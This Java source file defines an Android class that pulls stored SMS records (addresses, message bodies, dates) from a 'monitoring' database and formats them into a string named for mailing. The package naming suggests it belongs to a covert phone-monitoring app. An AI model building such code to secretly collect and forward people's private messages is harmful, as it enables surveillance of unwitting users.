package circle.internet.block;

import java.util.ArrayList;

import com.android.os.R;
import circle.db.controllers.MonitorSQLiteAdapter;
import circle.db.models.Sms;

import android.content.Context;
import android.util.Log;

public class SmsBlock {

	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;
	private static final String LOG_TAG = "monitoring";

	public static String getSms(Context context) {
		String mailSmsList = "";
		try {
			ArrayList<Sms> smsList = mAdapter.selectSms();
			if (smsList.size() != 0) {
				String sms = context.getResources().getString(R.string.sms);
				String incoming = context.getResources().getString(
						R.string.incoming);
				String outgoing = context.getResources().getString(
						R.string.outgoing);
				String draft = context.getResources().getString(R.string.draft);

				mailSmsList += "\n\n \"" + sms + "\" \n\n";
				for (Sms s : smsList) {
					if (s.getType() == 1) {
						mailSmsList += "  - " + incoming + " : ";
					} else if (s.getType() == 2) {
						mailSmsList += "  - " + outgoing + " : ";
					} else if (s.getType() == 3) {
						mailSmsList += "  - " + draft + " : ";
					}
					mailSmsList += s.getAddress() + " - \"" + s.getBody()
							+ "\" - " + s.getDate();
					mailSmsList += "\n\n";

				}
				Log.w(LOG_TAG, "getSms");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return mailSmsList;

	}
}
